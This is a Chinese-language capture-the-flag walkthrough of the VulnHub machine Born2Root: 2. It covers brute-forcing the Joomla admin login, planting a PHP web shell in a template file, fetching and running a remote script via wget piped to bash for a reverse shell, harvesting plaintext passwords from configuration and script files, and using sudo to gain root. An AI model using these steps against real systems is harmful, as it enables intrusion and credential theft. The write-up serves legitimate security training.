# Born2Root: 2

2024-11-7 https://www.vulnhub.com/entry/born2root-2,291/

difficulty: Not easy

## IP

192.168.5.40

## Scan

```
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
111/tcp   open  rpcbind
34835/tcp open  unknown
```

扫描 80 端口 发现 http://192.168.5.40/joomla/ 是 joomla 系统，发现一个疑似用户名 tim，http://192.168.5.40/joomla/README.txt 版本为 3.6 查找相关 exp 后没发现可以利用的。

找到 joomla 的登录页面 http://192.168.5.40/joomla/administrator/ 默认的登录名是 admin，使用 cewl 收集系统单词信息作为密码字典，进行爆破，最终得到登陆用户和密码：

```
cewl -d 5 http://192.168.5.40/joomla/ -w pass.txt

python joomla-brute.py -u http://192.168.5.40/joomla -w pass.txt -usr admin
admin:travel
```

使用凭据 admin:travel 登陆到系统，在顶部菜单中，Extensions -> Templates -> Templates 选中一个主题，编辑它的 error.php 页面，加入 php 一句话木马：`system($_GET['cmd']);`，然后点击保存。

通过下面的语句测试一句话命令执行成功：

```
curl -s http://192.168.5.40/joomla/templates/beez3/error.php?cmd=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

获得 web shell 的反弹连接：

```
curl -G --data-urlencode 'cmd=wget -q -O - http://192.168.5.3/5.3/8888.sh|bash' http://192.168.5.40/joomla/templates/beez3/error.php
```

先读取 joomla 的配置文件,发现数据库连接密码：

```
/var/www/html/joomla/configuration.php

public $host = 'localhost';
public $user = 'joomla';
public $password = 'redhat';
public $db = 'joomla';
public $dbprefix = 'v3rlo_';
public $live_site = '';

public $secret = 'qognJLTotftnguG7';
```

/home 目录下发现 tim 用户，尝试用 travel、redhat 和 qognJLTotftnguG7 这两个密码进行测试，发现不对。

进入数据库继续查看：

```
mysql -u joomla -h localhost -p
密码输入: redhat
```

但是在数据库中也没发现体现密码的数据表，这条路行不通。

继续寻找其他的提权点，经过搜索排除 sys lib 等目录后(或者 lin peas 进行枚举)，只发现了一个 可读的 py 脚本里面有 tim 的密码信息：

```
find / -readable -type f 2>/dev/null | grep -v '/sys\|/proc\|/lib\|/usr\|/var/www\|/run\|/boot\|/bin\|/sbin\|/var\|/etc'

www-data@born2root:/opt/scripts$ cat fileshare.py
#!/usr/bin/env python

import sys, paramiko

if len(sys.argv) < 5:
    print "args missing"
    sys.exit(1)

hostname = "localhost"
password = "lulzlol"
source = "/var/www/html/joomla"
dest = "/tmp/backup/joomla"

username = "tim"
port = 22

try:
    t = paramiko.Transport((hostname, port))
    t.connect(username=username, password=password)
    sftp = paramiko.SFTPClient.from_transport(t)
    sftp.get(source, dest)

finally:
    t.close()
```

发现 tim 的 ssh 密码为 lulzlol 使用此密码切换到 tim 用户，sudo -l 发现了有用全部权限，直接提权到 root：

```
(ALL : ALL) ALL

tim@born2root:~$ sudo /bin/bash
root@born2root:/home/tim# id
uid=0(root) gid=0(root) groups=0(root)
root@born2root:/home/tim# cd /root
root@born2root:~# ls
flag.txt
root@born2root:~# cat flag.txt

             .andAHHAbnn.
           .aAHHHAAUUAAHHHAn.
          dHP^~"        "~^THb.
    .   .AHF                YHA.   .
    |  .AHHb.              .dHHA.  |
    |  HHAUAAHAbn      adAHAAUAHA  |
    I  HF~"_____        ____ ]HHH  I
   HHI HAPK""~^YUHb  dAHHHHHHHHHH IHH
   HHI HHHD> .andHH  HHUUP^~YHHHH IHH
   YUI ]HHP     "~Y  P~"     THH[ IUP
    "  `HK                   ]HH'  "
        THAn.  .d.aAAn.b.  .dHHP
        ]HHHHAAUP" ~~ "YUAAHHHH[
        `HHP^~"  .annn.  "~^YHH'
         YHb    ~" "" "~    dHF
          "YAb..abdHHbndbndAP"
           THHAAb.  .adAHHF
            "UHHHHHHHHHHU"
              ]HHUUHHHHHH[
            .adHHb "HHHHHbn.
     ..andAAHHHHHHb.AHHHHHHHAAbnn..
.ndAAHHHHHHUUHHHHHHHHHHUP^~"~^YUHHHAAbn.
  "~^YUHHP"   "~^YUHHUP"        "^YUP^"
       ""         "~~"


W00t w00t ! If you are reading this text  then Congratulations !!

I hope you liked the second episode of 'Born2root' if you liked it please ping me in Twitter @h4d3sw0rm .

If you want to try more boxes like this created by me , try this new sweet lab called 'Wizard-Labs' which is a platform which hosts many boot2root machines to improve your pentesting skillset https://labs.wizard-security.net !
Until we meet again :-)
```
